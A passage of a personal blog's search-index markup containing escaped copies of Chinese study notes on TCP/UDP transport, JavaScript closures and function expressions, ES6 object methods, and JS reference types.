&lt;p&gt;UDP中⼀个最重要的信息是&lt;strong&gt;端⼝号&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;每个想访问⽹络的程序都需要绑定⼀个端⼝ 号。通过端⼝号UDP就能把指定的数据包发送给指定的程序了&lt;/p&gt;
&lt;p&gt;所以&lt;strong&gt;IP&lt;/strong&gt;通过&lt;strong&gt;IP地址&lt;/strong&gt;信息把数据包发送给指定的电脑，⽽&lt;strong&gt;UDP&lt;/strong&gt;通过&lt;strong&gt;端⼝号&lt;/strong&gt;把数据包分发给正确的程序。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UDP头&lt;/strong&gt;中除了⽬的端⼝，还有源端⼝号等信息&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1627717737811.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;在使⽤UDP发送数据时，有各种因素会导致数据包出错，虽然UDP可以校验数据是否正确，但是对于错误的 数据包，UDP并不提供重发机制，只是丢弃当前的包，⽽且UDP在发送之后也⽆法知道是否能达到⽬的地。&lt;/p&gt;
  &lt;br&gt;
&lt;p&gt;&lt;strong&gt;虽说UDP不能保证数据可靠性，但是传输速度却⾮常快&lt;/strong&gt;&lt;/p&gt;
  &lt;br&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;TCP：把数据完整地送达应⽤程序&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;⽤UDP来传输会&lt;strong&gt;存在两个问题&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据包在传输过程中容易丢失&lt;/li&gt;
&lt;li&gt;⼤⽂件会被拆分成很多⼩的数据包来传输，这些⼩的数据包会经过不同的路由，并在不同的时间到达接收 端，⽽UDP协议并不知道如何组装这些数据包，从⽽把这些数据包还原成完整的⽂件。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;p&gt;&lt;strong&gt;TCP（Transmission Control Protocol，传输控制协议）是⼀种⾯向 连接的、可靠的、基于字节流的传输层通信协议&lt;/strong&gt; 。   相对于UDP，TCP有下⾯两个特点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对于数据包丢失的情况，TCP提供重传机制；&lt;/li&gt;
&lt;li&gt;TCP引⼊了数据包排序机制，⽤来保证把乱序的数据包组合成⼀个完整的⽂件。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;tcp完整的连接过程&#34;&gt;TCP完整的连接过程&lt;/h2&gt;
&lt;p&gt;⼀个完整的TCP连接的⽣命周期包括了“&lt;strong&gt;建⽴连接&lt;/strong&gt;”“&lt;strong&gt;传输数据&lt;/strong&gt;”和“&lt;strong&gt;断开连接&lt;/strong&gt;”三个阶 段。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;连接建立&lt;/strong&gt;。通过&amp;quot;&lt;strong&gt;三次握手&lt;/strong&gt;&amp;quot;来建立客户端和服务器端的连接。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;传输数据阶段&lt;/strong&gt;。&lt;strong&gt;接收端需要对每个数据包进⾏确认操作&lt;/strong&gt;，&lt;/p&gt;
&lt;p&gt;也就是接收端在接收到数据包 之后，需要发送确认数据包给发送端。所以当发送端发送了⼀个数据包之后，在规定时间内没有接收到接 收端反馈的确认消息，则判断为数据包丢失，并触发发送端的重发机制。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;⼀个⼤的⽂件在传输过程 中会被拆分成很多⼩的数据包，这些数据包到达接收端后，接收端会按照TCP头中的序号为其排序，从⽽ 保证组成完整的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;断开连接阶段&lt;/strong&gt;。“&lt;strong&gt;四次挥⼿&lt;/strong&gt;”来保证双 ⽅都能断开连接。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;互联⽹中的数据是通过数据包来传输的，数据包在传输过程中容易丢失或出错。&lt;/li&gt;
&lt;li&gt;IP负责把数据包送达⽬的主机。&lt;/li&gt;
&lt;li&gt;UDP负责把数据包送达具体应⽤。&lt;/li&gt;
&lt;li&gt;⽽TCP保证了数据完整地传输，它的连接可分为三个阶段：建⽴连接、传输数据和断开连接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​&lt;/p&gt;
">TCP协议：如何保证⻚⾯⽂件能被完整送达浏览器？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/han-shu-biao-da-shi/"" data-c="
          &lt;h2 id=&#34;定义&#34;&gt;定义&lt;/h2&gt;
&lt;p&gt;定义函数的 方式有两种：一种是&lt;strong&gt;函数声明&lt;/strong&gt;，另一种就是&lt;strong&gt;函数表达式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;关于函数声明，它的一个重要特征就是&lt;strong&gt;函数声明提升&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;执行以下代码的结果可 能会让人意想不到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if(condition){ 
 function sayHi(){ 
 alert(&amp;quot;Hi!&amp;quot;); 
 } 
} else { 
 function sayHi(){ 
 alert(&amp;quot;Yo!&amp;quot;); 
 } 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这在 ECMAScript 中属于无效语法，JavaScript 引擎会尝试修正错误，将其转换为合 理的状态。大多数浏览器会返回第二个声明。&lt;/p&gt;
&lt;p&gt;修改&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var sayHi; 
if(condition){ 
 sayHi = function(){ 
 alert(&amp;quot;Hi!&amp;quot;); 
 }; 
} else { 
 sayHi = function(){ 
 alert(&amp;quot;Yo!&amp;quot;); 
 }; 
} 

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;递归&#34;&gt;递归&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function factorial(num){ 
 if (num &amp;lt;= 1){ 
 return 1; 
 } else { 
 return num * factorial(num-1); 
 } 
} 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;减小耦合，但增大了内存开销。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function factorial(num){ 
 if (num &amp;lt;= 1){ 
 return 1; 
 } else { 
 return num * arguments.callee(num-1); 
 } 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;闭包&#34;&gt;闭包&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;闭包&lt;/strong&gt;是指有权访问另一个 函数作用域中的变量的函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function createFunctions(){ 
 var result = new Array(); 
 for (var i=0; i &amp;lt; 10; i++){ 
 result[i] = function(){ 
 return i; 
 }; 
 } 
 return result; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以它们引用的都是同一个变量 i 。 当 createFunctions()函数返回后，变量 i 的值是 10&lt;/p&gt;
&lt;p&gt;修改&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function createFunctions(){ 
 var result = new Array(); 
 for (var i=0; i &amp;lt; 10; i++){ 
 result[i] = function(num){ 
 return function(){ 
 return num; 
 }; 
 }(i);
 } 
 return result; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这个 匿名函数内部，又创建并返回了一个访问 num 的闭包&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;this对象&#34;&gt;this对象&lt;/h3&gt;
&lt;p&gt;匿名函数的执行环境具有&lt;strong&gt;全局性&lt;/strong&gt;，因此其 this 对象通常指向 window&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var name = &amp;quot;The Window&amp;quot;; 
var object = { 
 name : &amp;quot;My Object&amp;quot;, 
 getNameFunc : function(){ 
 return function(){ 
 return this.name; 
 }; 
 } 
}; 
alert(object.getNameFunc()()); //&amp;quot;The Window&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;每个函数在被调用时都会自动取得两个特殊变量：this 和 arguments。内部函 数在搜索这两个变量时，只会搜索到其活动对象为止，因此永远不可能直接访问外部函数中的这两个变量&lt;/p&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var name = &amp;quot;The Window&amp;quot;; 
var object = { 
 name : &amp;quot;My Object&amp;quot;, 
 getName: function(){ 
 return this.name; 
 } 
}; 



object.getName(); //&amp;quot;My Object&amp;quot; 
(object.getName)(); //&amp;quot;My Object&amp;quot; 
(object.getName = object.getName)(); //&amp;quot;The Window&amp;quot;，
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第二行代码在调用这个方法前先给它加上了括号。虽然加上括号之后，就好像只 是在引用一个函数，但 this 的值得到了维持，因为 object.getName 和(object.getName)的定义 是相同的。&lt;/p&gt;
&lt;p&gt;第三行代码先执行了一条赋值语句，然后再调用赋值后的结果。因为这个赋值表达式的值是 函数本身，所以 this 的值不能得到维持，结果就返回了&amp;quot;The Window&amp;quot;。&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;内存泄漏&#34;&gt;内存泄漏&lt;/h3&gt;
&lt;p&gt;如果闭包的作用域链中保存着一个 HTML 元素，那么就意味着该元素将无法被销毁&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function assignHandler(){ 
 var element = document.getElementById(&amp;quot;someElement&amp;quot;); 
 element.onclick = function(){ 
 alert(element.id); 
 }; 
} 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于匿名函数保存了一个对 assignHandler()的活动对象的引用，因此 就会导致无法减少 element 的引用数&lt;/p&gt;
&lt;p&gt;修改&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function assignHandler(){ 
 var element = document.getElementById(&amp;quot;someElement&amp;quot;); 
 var id = element.id; 
 
 element.onclick = function(){ 
 alert(id); 
 }; 
 
 element = null; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过把 element.id 的一个副本保存在一个变量中，并且在闭包中引用该变量消 除了循环引用&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;模仿块级作用域&#34;&gt;模仿块级作用域&lt;/h2&gt;
&lt;p&gt;语法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;(function(){ 
 //这里是块级作用域
})();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上代码定义并立即调用了一个匿名函数，可以避免命名的变量被其他地方调用&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;私有变量&#34;&gt;私有变量&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;(function(){ 
    //私有变量
    var a 
    //私有函数
    function b(){
    	...  
    }
 (function(){ 
 //这里可以去调用
	})();
})();
&lt;/code&gt;&lt;/pre&gt;
"> 函数表达式</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/es6-day2/"" data-c="
          &lt;h2 id=&#34;对象扩展&#34;&gt;对象扩展&lt;/h2&gt;
&lt;p&gt;ES6 一共有 5 种方法可以遍历对象的属性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）for...in&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;for...in&lt;/code&gt;循环遍历对象自身的和继承的可枚举属性（不含 Symbol 属性）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）Object.keys(obj)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Object.keys&lt;/code&gt;返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 Symbol 属性）的键名。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（3）Object.getOwnPropertyNames(obj)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Object.getOwnPropertyNames&lt;/code&gt;返回一个数组，包含对象自身的所有属性（不含 Symbol 属性，但是包括不可枚举属性）的键名。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（4）Object.getOwnPropertySymbols(obj)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Object.getOwnPropertySymbols&lt;/code&gt;返回一个数组，包含对象自身的所有 Symbol 属性的键名。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（5）Reflect.ownKeys(obj)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Reflect.ownKeys&lt;/code&gt;返回一个数组，包含对象自身的（不含继承的）所有键名，不管键名是 Symbol 或字符串，也不管是否可枚举。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;super-关键字&#34;&gt;super 关键字&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;super&lt;/code&gt;指向当前对象的原型对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const proto = {
  foo: &#39;hello&#39;
};

const obj = {
  foo: &#39;world&#39;,
  find() {
    return super.foo;
  }
};

Object.setPrototypeOf(obj, proto);
obj.find() // &amp;quot;hello&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;objectis&#34;&gt;&lt;code&gt;Object.is()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;它用来比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;Object.is(&#39;foo&#39;, &#39;foo&#39;)
// true
Object.is({}, {})
// false

+0 === -0 //true
NaN === NaN // false

Object.is(+0, -0) // false
Object.is(NaN, NaN) // true
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;objectassign&#34;&gt;&lt;code&gt;Object.assign()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Object.assign()&lt;/code&gt;方法用于对象的合并，将源对象（source）的所有可枚举属性，复制到目标对象（target）。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const target = { a: 1 };

const source1 = { b: 2 };
const source2 = { c: 3 };

Object.assign(target, source1, source2);
target // {a:1, b:2, c:3}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Object.assign()&lt;/code&gt;方法的第一个参数是目标对象，后面的参数都是源对象。&lt;/p&gt;
&lt;p&gt;如果目标对象与源对象有同名属性，或多个源对象有同名属性，则后面的属性会覆盖前面的属性。&lt;/p&gt;
&lt;p&gt;如果该参数不是对象，则会先转成对象，然后返回。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;typeof Object.assign(2) // &amp;quot;object&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;上面代码中，&lt;code&gt;v1&lt;/code&gt;、&lt;code&gt;v2&lt;/code&gt;、&lt;code&gt;v3&lt;/code&gt;分别是字符串、布尔值和数值，结果只有字符串合入目标对象（以字符数组的形式），数值和布尔值都会被忽略。这是因为只有字符串的包装对象，会产生可枚举属性。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const v1 = &#39;abc&#39;;
const v2 = true;
const v3 = 10;

const obj = Object.assign({}, v1, v2, v3);
console.log(obj); // { &amp;quot;0&amp;quot;: &amp;quot;a&amp;quot;, &amp;quot;1&amp;quot;: &amp;quot;b&amp;quot;, &amp;quot;2&amp;quot;: &amp;quot;c&amp;quot; }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;注意点&#34;&gt;注意点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;浅拷贝&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;源对象某个属性的值是对象，那么目标对象拷贝得到的是这个对象的引用。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const obj1 = {a: {b: 1}};
const obj2 = Object.assign({}, obj1);

obj1.a.b = 2;
obj2.a.b // 2
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;同名属性的替换&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一旦遇到同名属性，&lt;code&gt;Object.assign()&lt;/code&gt;的处理方法是替换，而不是添加。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const target = { a: { b: &#39;c&#39;, d: &#39;e&#39; } }
const source = { a: { b: &#39;hello&#39; } }
Object.assign(target, source)
// { a: { b: &#39;hello&#39; } }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;数组的处理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Object.assign()&lt;/code&gt;可以用来处理数组，但是会把数组视为对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;Object.assign([1, 2, 3], [4, 5])
// [4, 5, 3]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，&lt;code&gt;Object.assign()&lt;/code&gt;把数组视为属性名为 0、1、2 的对象，因此源数组的 0 号属性&lt;code&gt;4&lt;/code&gt;覆盖了目标数组的 0 号属性&lt;code&gt;1&lt;/code&gt;   这里的&lt;code&gt;key&lt;/code&gt;值就是数组的&lt;code&gt;index&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;取值函数的处理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;复制函数的返回值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const source = {
  get foo() { return 1 }
};
const target = {};

Object.assign(target, source)
// { foo: 1 }
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;常用点&#34;&gt;常用点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;为对象添加属性&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Point {  constructor(x, y) {    Object.assign(this, {x, y});  }}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;为对象添加方法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;Object.assign(SomeClass.prototype, {  someMethod(arg1, arg2) {    ···  },  anotherMethod() {    ···  }});// 等同于下面的写法SomeClass.prototype.someMethod = function (arg1, arg2) {  ···};SomeClass.prototype.anotherMethod = function () {  ···};
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;克隆对象&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;采用这种方法克隆，只能克隆原始对象自身的值，不能克隆它继承的值。&lt;/p&gt;
&lt;p&gt;当克隆对象只有一级时候可以看做深拷贝&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function clone(origin) {  return Object.assign({}, origin);}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;合并多个对象&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const merge =  (target, ...sources) =&amp;gt; Object.assign(target, ...sources);
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;为属性指定默认值&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const DEFAULTS = {  logLevel: 0,  outputFormat: &#39;html&#39;};function processContent(options) {  options = Object.assign({}, DEFAULTS, options);  console.log(options);  // ...}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Object.assign()&lt;/code&gt;方法将&lt;code&gt;DEFAULTS&lt;/code&gt;和&lt;code&gt;options&lt;/code&gt;合并成一个新对象，如果两者有同名属性，则&lt;code&gt;options&lt;/code&gt;的属性值会覆盖&lt;code&gt;DEFAULTS&lt;/code&gt;的属性值。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;objectgetownpropertydescriptors&#34;&gt;&lt;code&gt;Object.getOwnPropertyDescriptors()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;​			会返回某个对象属性的描述对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const obj = {  foo: 123,  get bar() { return &#39;abc&#39; }};Object.getOwnPropertyDescriptors(obj)// { foo://    { value: 123,//      writable: true,//      enumerable: true,//      configurable: true },//   bar://    { get: [Function: get bar],//      set: undefined,//      enumerable: true,//      configurable: true } }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;__proto__属性objectsetprototypeofobjectgetprototypeof&#34;&gt;__proto__属性，Object.setPrototypeOf()，Object.getPrototypeOf()&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;__proto__&lt;/code&gt;属性，用来读取或设置当前对象的原型对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// es5 的写法const obj = {  method: function() { ... }};obj.__proto__ = someOtherObj;// es6 的写法var obj = Object.create(someOtherObj);obj.method = function() { ... };
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;objectsetprototypeof&#34;&gt;&lt;code&gt;Object.setPrototypeOf()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;用来设置一个对象的原型对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;let proto = {};let obj = { x: 10 };Object.setPrototypeOf(obj, proto);proto.y = 20;proto.z = 40;obj.x // 10obj.y // 20obj.z // 40
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;objectgetprototypeof&#34;&gt;&lt;code&gt;Object.getPrototypeOf()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;用于读取一个对象的原型对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function Rectangle() {  // ...}const rec = new Rectangle();Object.getPrototypeOf(rec) === Rectangle.prototype// trueObject.setPrototypeOf(rec, Object.prototype);Object.getPrototypeOf(rec) === Rectangle.prototype// false
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;objectkeysobjectvaluesobjectentries&#34;&gt;Object.keys()，Object.values()，Object.entries()&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Object.keys&lt;/code&gt;方法，返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键名。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var obj = { foo: &#39;bar&#39;, baz: 42 };Object.keys(obj)// [&amp;quot;foo&amp;quot;, &amp;quot;baz&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;Object.values&lt;/code&gt;方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const obj = { foo: &#39;bar&#39;, baz: 42 };Object.values(obj)// [&amp;quot;bar&amp;quot;, 42]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;Object.entries()&lt;/code&gt;方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值对数组。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const obj = { foo: &#39;bar&#39;, baz: 42 };Object.entries(obj)// [ [&amp;quot;foo&amp;quot;, &amp;quot;bar&amp;quot;], [&amp;quot;baz&amp;quot;, 42] ]
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
">ES6 day2</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-yin-yong-lei-xing/"" data-c="
          &lt;h2 id=&#34;object&#34;&gt;Object&lt;/h2&gt;
&lt;h3 id=&#34;表示方法&#34;&gt;表示方法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;new 操作符后跟 Object 构造函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;var person = new Object();&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用对象字面量表示法&lt;/p&gt;
&lt;p&gt;&lt;code&gt;var person = { name : &amp;quot;Nicholas&amp;quot;, age : 29 };&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;访问方式&#34;&gt;访问方式&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;alert(person[&amp;quot;name&amp;quot;]); //&amp;quot;Nicholas&amp;quot; 

alert(person.name); //&amp;quot;Nicholas&amp;quot; 

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;array&#34;&gt;Array&lt;/h2&gt;
&lt;h3 id=&#34;表示形式&#34;&gt;表示形式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;var colors = new Array(20);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;var colors = new Array(&amp;quot;red&amp;quot;, &amp;quot;blue&amp;quot;, &amp;quot;green&amp;quot;);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;var colors = [&amp;quot;red&amp;quot;, &amp;quot;blue&amp;quot;, &amp;quot;green&amp;quot;];&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;检查数组&#34;&gt;检查数组&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;if (value instanceof Array){ //对数组执行某些操作 }&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Array.isArray()方法&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Object.prototype.tostring.call(this)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;转换方法&#34;&gt;转换方法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;alert(colors.toString()); // red,blue,green&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;alert(colors.valueOf()); // red,blue,green&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;alert(colors); // red,blue,green&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;join&#34;&gt;&lt;code&gt;join()&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var colors = [&amp;quot;red&amp;quot;, &amp;quot;green&amp;quot;, &amp;quot;blue&amp;quot;]; 
alert(colors.join(&amp;quot;,&amp;quot;)); //red,green,blue 
alert(colors.join(&amp;quot;||&amp;quot;)); //red||green||blue 
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;pop-push-shift-unshift&#34;&gt;&lt;code&gt;pop() push() shift() unshift()&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var colors = new Array(); //创建一个数组
var count = colors.unshift(&amp;quot;red&amp;quot;, &amp;quot;green&amp;quot;);
count = colors.unshift(&amp;quot;black&amp;quot;); 

//数组中各项的顺序为&amp;quot;black&amp;quot;、&amp;quot;red&amp;quot;、&amp;quot;green&amp;quot;。

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;重排序方法&#34;&gt;重排序方法&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;reverse()&lt;/code&gt;会反转数组项的顺序&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var values = [1, 2, 3, 4, 5]; 
values.reverse(); 
alert(values); //5,4,3,2,1
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;sort()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;sort()方法会调用每个数组项的 toString()转型方法，然后比较得到的字符串，以 确定如何排序。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var values = [0, 1, 5, 10, 15]; 
values.sort(); 
alert(values); //0,1,10,15,5 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;改造&lt;/p&gt;
